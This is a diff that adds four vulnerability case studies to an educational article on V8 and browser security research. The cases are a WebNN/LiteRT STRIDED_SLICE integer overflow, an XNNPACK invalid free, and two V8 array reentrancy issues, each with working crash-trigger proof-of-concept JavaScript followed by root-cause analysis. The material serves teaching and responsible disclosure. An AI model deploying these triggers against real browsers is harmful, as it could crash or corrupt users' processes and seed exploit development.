@@ -1336,3 +1336,727 @@ Each individual case study should additionally identify its exact V8 revision, p
 ## Disclaimer
 
 This repository is intended for security research, debugging, education, and responsible vulnerability analysis. Synthetic examples in this article are explanatory and are not claims about a particular upstream V8 revision unless explicitly identified as such.
+
+
+---
+
+# 37. Disclosed Case Study: WebNN / LiteRT STRIDED_SLICE Integer Overflow
+
+**Issue:** Chromium issue 541043774
+
+**Status:** Fixed / disclosed, according to the research record supplied for this repository.
+
+This case study is useful because it demonstrates how a public browser API can reach a native inference backend and turn an integer-arithmetic mistake into a memory-safety failure.
+
+## Attack surface
+
+The relevant path is:
+
+```text
+navigator.ml
+   |
+   v
+MLGraphBuilder
+   |
+   +-- constant()
+   +-- tile()
+   +-- slice()
+   |
+   v
+WebNN service
+   |
+   v
+LiteRT / TensorFlow Lite
+   |
+   v
+STRIDED_SLICE
+```
+
+The supplied analysis identifies the affected areas as WebNN graph construction, the LiteRT/TFLite STRIDED_SLICE implementation, and the CPU backend.
+
+## Minimal trigger
+
+The supplied PoC uses a one-byte constant and asks the graph builder to construct a very large tiled tensor followed by a strided slice:
+
+~~~html
+<script>
+async function trigger() {
+  if (!navigator.ml) return;
+
+  const context = await navigator.ml.createContext({deviceType: 'cpu'});
+  const builder = new MLGraphBuilder(context);
+
+  const DIM = 2147483647;
+  const STRIDE = 126322568;
+
+  const small = builder.constant(
+    {dataType: 'uint8', shape: [1]},
+    new Uint8Array([42])
+  );
+
+  const tiled = builder.tile(small, [DIM]);
+
+  const sliced = builder.slice(
+    tiled,
+    [0],
+    [DIM],
+    {strides: [STRIDE]}
+  );
+
+  await builder.build({output: sliced});
+}
+trigger();
+</script>
+~~~
+
+The important security-research lesson is that the page supplies only a tiny source constant. The large intermediate object is created by the native graph/inference pipeline.
+
+## Root cause
+
+The reported vulnerable calculation can be simplified to:
+
+~~~text
+out_dim = (start + size + stride - 1) / stride
+~~~
+
+when evaluated with signed 32-bit arithmetic.
+
+With:
+
+~~~text
+size   = INT32_MAX
+stride = 126322568
+~~~
+
+the intermediate addition wraps. The resulting dimension is negative rather than representing the actual number of iterations.
+
+The supplied analysis reports an effective output dimension of:
+
+~~~text
+-15
+~~~
+
+The kernel subsequently has an output allocation inconsistent with the number of elements that its iteration logic will produce.
+
+The actual number of iterations is:
+
+~~~text
+ceil(2147483647 / 126322568) = 17
+~~~
+
+For an int8 output, that means 17 one-byte writes.
+
+The important invariant is:
+
+~~~text
+computed output allocation
+        >=
+all elements written by the kernel
+~~~
+
+The overflow breaks that invariant.
+
+## Why graph construction matters
+
+Both stages are compile-time constants:
+
+~~~text
+constant
+   |
+   v
+tile
+   |
+   v
+persistent intermediate
+   |
+   v
+strided slice
+~~~
+
+The supplied analysis reports that TILE materializes the large intermediate in the native WebNN/LiteRT process and that STRIDED_SLICE then enters a constant-folding path.
+
+That makes this case particularly valuable for beginners:
+
+> A JavaScript API can look harmless while the native graph compiler performs substantial work during graph construction.
+
+## Security evidence
+
+The supplied report describes an ASan heap-buffer-overflow / invalid memory access in the STRIDED_SLICE execution path, with the write eventually involving:
+
+~~~text
+tflite::SequentialTensorWriter<signed char>::Write
+~~~
+
+The exact impact should be described according to the sanitizer result and affected process configuration rather than automatically being labeled as arbitrary code execution.
+
+## Research lesson
+
+This vulnerability demonstrates a recurring pattern:
+
+~~~text
+large attacker-controlled integer
+        +
+signed integer arithmetic
+        +
+negative/incorrect dimension
+        +
+allocation based on corrupted dimension
+        +
+kernel loop using the original logical range
+        =
+memory-safety violation
+~~~
+
+The defensive pattern is equally important:
+
+~~~text
+validate arithmetic
+        +
+use overflow-safe dimension calculations
+        +
+reject invalid tensor shapes
+        +
+ensure allocation and iteration agree
+~~~
+
+---
+
+# 38. Disclosed Case Study: WebNN / XNNPACK Bad-Free in Quantized Unary Fusion
+
+**Issue:** Chromium issue 539052047
+
+**Status:** Fixed / disclosed, according to the supplied research record.
+
+This case is fundamentally different from the STRIDED_SLICE issue. Instead of an integer overflow, the central invariant is **ownership**.
+
+## Attack surface
+
+The supplied call path is:
+
+~~~text
+WebNN
+  |
+  v
+LiteRT / WebNN integration
+  |
+  v
+XNNPACK subgraph optimization
+  |
+  v
+quantized unary fusion
+  |
+  v
+temporary subgraph
+~~~
+
+The trigger is a sufficiently long chain of quantized unary operations.
+
+The supplied PoC uses 12:
+
+~~~text
+DQ -> Tanh -> Q
+DQ -> Tanh -> Q
+...
+12 times
+~~~
+
+and the research notes identify:
+
+~~~text
+XNN_MAX_UNARY_FUSION_NODES = 10
+~~~
+
+as the important threshold.
+
+## Simplified PoC
+
+~~~javascript
+async function trigger() {
+  const ctx = await navigator.ml.createContext({deviceType: 'cpu'});
+  const builder = new MLGraphBuilder(ctx);
+
+  const shape = [1, 4];
+  const scalarShape = [1, 1];
+
+  const mk = v => new Float32Array([v]);
+  const mz = () => new Int8Array([0]);
+
+  let current = builder.input(
+    'input',
+    {dataType: 'int8', shape}
+  );
+
+  for (let i = 0; i < 12; i++) {
+    const dqScale = builder.constant(
+      {dataType: 'float32', shape: scalarShape},
+      mk(0.05)
+    );
+
+    const dqZp = builder.constant(
+      {dataType: 'int8', shape: scalarShape},
+      mz()
+    );
+
+    const dq = builder.dequantizeLinear(
+      current, dqScale, dqZp
+    );
+
+    const th = builder.tanh(dq);
+
+    const qScale = builder.constant(
+      {dataType: 'float32', shape: scalarShape},
+      mk(0.05)
+    );
+
+    const qZp = builder.constant(
+      {dataType: 'int8', shape: scalarShape},
+      mz()
+    );
+
+    current = builder.quantizeLinear(
+      th, qScale, qZp
+    );
+  }
+
+  const graph = await builder.build({output: current});
+  ctx.destroy();
+}
+
+trigger();
+~~~
+
+## Root cause
+
+The important function identified by the supplied analysis is:
+
+~~~text
+xnn_subgraph_fuse_unary_quantized_into_lut()
+~~~
+
+The function creates a temporary subgraph whose node/value storage is backed by local stack arrays.
+
+Conceptually:
+
+~~~text
+stack frame
++-----------------------------+
+| unary_values[]              |
+| unary_nodes[]               |
++-----------------------------+
+          |
+          v
+temporary subgraph.nodes
+~~~
+
+The temporary subgraph therefore points into stack storage.
+
+The dangerous transition occurs when the temporary subgraph is passed into code that can grow the node array:
+
+~~~text
+run_subgraph_to_make_lut()
+        |
+        v
+xnn_create_runtime_v4()
+        |
+        v
+xnn_subgraph_optimize()
+        |
+        v
+xnn_subgraph_rewrite_dequant_bmm()
+        |
+        v
+xnn_subgraph_reserve_nodes()
+        |
+        v
+xnn_reallocate_memory()
+        |
+        v
+realloc(subgraph->nodes)
+~~~
+
+The invariant that fails is:
+
+~~~text
+pointer passed to realloc()
+        must reference heap-allocated storage
+        or satisfy the allocator's ownership contract
+~~~
+
+The pointer instead references a stack array.
+
+ASan consequently reports a bad free / invalid reallocation involving stack memory.
+
+## Why this is not simply "double-free"
+
+The supplied research originally describes this as a double-free. At the implementation level, the more precise description is:
+
+> **invalid free/reallocation of stack-backed storage**
+
+Calling it a double-free without evidence of two frees of the same heap allocation would be misleading.
+
+This distinction matters in a professional vulnerability report.
+
+## ASan evidence
+
+The supplied report identifies an address in the stack frame of:
+
+~~~text
+xnn_subgraph_fuse_unary_quantized_into_lut
+~~~
+
+and associates the address with the local:
+
+~~~text
+unary_nodes
+~~~
+
+That is strong evidence for an ownership/lifetime violation.
+
+## Research lesson
+
+This case demonstrates a different security invariant:
+
+~~~text
+allocation lifetime
+        +
+ownership
+        +
+API contract
+        =
+safe memory management
+~~~
+
+A pointer being valid enough to read is not sufficient. A pointer passed to a memory-management primitive must also satisfy that primitive's ownership requirements.
+
+---
+
+# 39. V8 Case Study: Array.prototype.sort Mutation During Comparison
+
+**Status:** Recently observed duplicate / investigation record.
+
+This case should be kept separate from confirmed fixed vulnerabilities until the upstream issue status and root cause are independently established.
+
+The supplied reproducer intentionally changes the array while the comparator is executing:
+
+~~~javascript
+let arr;
+let do_evil = false;
+
+function cmp(a, b) {
+  if (do_evil) {
+    do_evil = false;
+
+    const old_len = arr.length;
+
+    for (let i = 0; i < 200; i++) {
+      arr.push(999);
+    }
+
+    while (arr.length > old_len) {
+      arr.pop();
+    }
+
+    arr[0] = 888;
+    arr[1] = 777;
+  }
+
+  return a - b;
+}
+
+function do_sort() {
+  return arr.sort(cmp);
+}
+
+%PrepareFunctionForOptimization(cmp);
+%PrepareFunctionForOptimization(do_sort);
+
+for (let i = 0; i < 20; i++) {
+  arr = [8, 4, 6, 2, 7, 1, 5, 3];
+  do_sort();
+}
+
+%OptimizeMaglevOnNextCall(do_sort);
+
+arr = [8, 4, 6, 2, 7, 1, 5, 3];
+do_sort();
+
+arr = [80, 40, 60, 20, 70, 10, 50, 30];
+
+do_evil = true;
+do_sort();
+
+print("Expected: [10,20,30,40,50,60,70,80]");
+print("Actual:   [" + arr.join(",") + "]");
+~~~
+
+The reported result was:
+
+~~~text
+Expected: [10,20,30,40,50,60,70,80]
+Actual:   [888,777,60,20,70,10,50,30]
+~~~
+
+## Why this is interesting
+
+The important condition is mutation during a callback invoked by an array operation.
+
+That creates a general reentrancy question:
+
+~~~text
+operation starts
+      |
+      v
+internal state captured
+      |
+      v
+user callback executes
+      |
+      v
+array structure changes
+      |
+      v
+operation resumes
+      |
+      v
+old assumptions reused?
+~~~
+
+For security research, the critical next step is to determine whether the observed behavior is simply permitted ECMAScript semantics, an implementation bug, or a memory-safety violation.
+
+The output difference alone is not sufficient to classify it as memory corruption.
+
+---
+
+# 40. V8 Case Study: Array.prototype.join Reentrancy and Length Invalidation
+
+**Issue:** Chromium issue 565916866
+
+**Status:** Recently reported/duplicate according to the supplied record; treat as a research case rather than an independently confirmed vulnerability unless the upstream issue establishes otherwise.
+
+The supplied PoC uses a custom separator object whose `toString()` mutates the array during `Array.prototype.join`.
+
+The essential sequence is:
+
+~~~text
+join begins
+   |
+   v
+separator conversion
+   |
+   v
+user-controlled toString()
+   |
+   +--> victim.length = 0
+   +--> victim[0] = 'A'
+   +--> victim.length = 65537
+   |
+   v
+join resumes
+   |
+   v
+internal length assumptions reused
+~~~
+
+The supplied debug-build failure was:
+
+~~~text
+CSA_DCHECK failed:
+Torque assert 'len <= Convert<uintptr>(kFixedArrayMaxLength)' failed
+[src/builtins/array-join.tq:359]
+~~~
+
+with the stack entering:
+
+~~~text
+join
+  -> Runtime_AbortCSADcheck
+  -> Isolate::PushStackTraceAndDie
+~~~
+
+## Root-cause hypothesis
+
+The important hypothesis is an invalidated length/structure assumption across a user callback.
+
+The initial state uses a very large array length:
+
+~~~text
+0xffffffff
+~~~
+
+The separator's `toString()` then changes the array to:
+
+~~~text
+65537
+~~~
+
+The security-relevant question is whether all internal length and buffer calculations are revalidated after the callback returns.
+
+The correct invariant is:
+
+~~~text
+state captured before callback
+        |
+        v
+user code may mutate observable state
+        |
+        v
+internal state must be revalidated
+        |
+        v
+post-callback calculations use current valid state
+~~~
+
+A debug assertion failure proves that an internal invariant was violated.
+
+It does **not**, by itself, prove the claimed OOB write in a release build. That stronger impact requires an independent release/ASan demonstration.
+
+## Why this belongs in the article
+
+This is an excellent example of why reentrancy matters in JavaScript engine security:
+
+~~~text
+native-looking internal algorithm
+          +
+JavaScript callback
+          =
+state can change unexpectedly
+~~~
+
+It also shows why a security researcher should distinguish:
+
+- debug-only assertion;
+- release behavior;
+- sanitizer-confirmed memory corruption;
+- demonstrated primitive.
+
+---
+
+# 41. Comparing the four case studies
+
+| Case | Component | Primary invariant | Evidence class | Status in this repository |
+|---|---|---|---|---|
+| STRIDED_SLICE | WebNN / LiteRT | allocation size vs. iteration count | reported memory-safety violation | fixed/disclosed |
+| XNNPACK fusion | WebNN / XNNPACK | ownership/lifetime of allocation | ASan invalid free/reallocation | fixed/disclosed |
+| Array.sort mutation | V8 | state/representation under callback mutation | behavioral corruption-like result | duplicate/investigation |
+| Array.join mutation | V8 | post-callback length/state validation | CSA assertion | duplicate/investigation |
+
+This comparison demonstrates an important point:
+
+> Memory corruption is not one bug pattern.
+
+The underlying invariant can be arithmetic, ownership, representation, lifetime, or reentrancy.
+
+---
+
+# 42. What these disclosed cases teach about V8 research
+
+The WebNN cases are especially useful as training material because they demonstrate two different native-memory failure modes reachable through a browser-facing API.
+
+The V8 cases then move the investigation closer to the JavaScript engine itself:
+
+~~~text
+WebNN API
+   |
+   +--> native numerical backend
+   |       |
+   |       +--> arithmetic invariant
+   |       +--> ownership invariant
+   |
+   v
+V8 engine
+   |
+   +--> optimization invariant
+   +--> representation invariant
+   +--> reentrancy invariant
+~~~
+
+The common methodology remains the same:
+
+1. Identify the entry point.
+2. Reduce the trigger.
+3. Capture sanitizer/debugger evidence.
+4. Identify the first broken invariant.
+5. Trace the state into native code.
+6. Separate confirmed facts from hypotheses.
+7. Determine the exact security primitive.
+8. Compare against the upstream fix.
+9. Add a regression test.
+10. Document the result precisely.
+
+---
+
+# 43. Disclosure-quality reporting template
+
+For a disclosed vulnerability, the preferred structure is:
+
+~~~markdown
+# <Title>
+
+**Status:** Fixed / disclosed
+**Issue:** <upstream issue>
+**Affected component:** <component>
+
+## Summary
+
+<short factual description>
+
+## Attack surface
+
+<public API or execution path>
+
+## Reproducer
+
+<minimal PoC>
+
+## Observed failure
+
+<ASan / debug assertion / crash>
+
+## Root cause
+
+<first broken invariant>
+
+## Security impact
+
+<only the impact demonstrated by evidence>
+
+## Fix
+
+<upstream patch or defensive change>
+
+## Regression
+
+<test that prevents recurrence>
+
+## References
+
+<upstream issue, patch, advisory, CVE if applicable>
+~~~
+
+For a zero-day or under-investigation issue, change the status and explicitly mark hypotheses instead of presenting them as established facts.
+
+---
+
+# 44. The core lesson
+
+Across all of these examples, the most reusable security skill is not memorizing one V8 structure or one XNNPACK function.
+
+It is learning to ask:
+
+~~~text
+What did the code assume?
+        |
+        v
+Was that assumption still true?
+        |
+        v
+If not, who changed the state?
+        |
+        v
+What address/size/lifetime followed?
+        |
+        v
+What does the evidence prove?
+~~~
+
+That is the bridge between beginner crash analysis and senior-level root-cause research.
